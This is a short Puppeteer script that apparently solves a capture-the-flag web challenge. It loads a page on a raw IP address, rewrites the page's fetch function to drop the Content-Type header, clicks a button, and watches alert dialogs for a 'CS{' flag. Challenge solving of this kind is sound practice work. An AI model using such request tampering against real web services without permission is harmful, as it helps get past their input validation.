const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  page.on('dialog', async dialog => {
    const message = dialog.message();
    console.log('ALERT:', message);
    if (message.includes('CS{')) {
      console.log('*** FLAG FOUND ***');
    }
    await dialog.accept();
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Override fetch to NOT set Content-Type header at all
    await page.evaluate(() => {
      const originalFetch = window.fetch;
      window.fetch = function(url, options = {}) {
        // Create new options without Content-Type
        const newOptions = { ...options };
        if (newOptions.headers) {
          const newHeaders = { ...newOptions.headers };
          delete newHeaders['Content-Type'];
          delete newHeaders['content-type'];
          newOptions.headers = newHeaders;
        }
        return originalFetch(url, newOptions);
      };
    });
    
    // Click the button
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

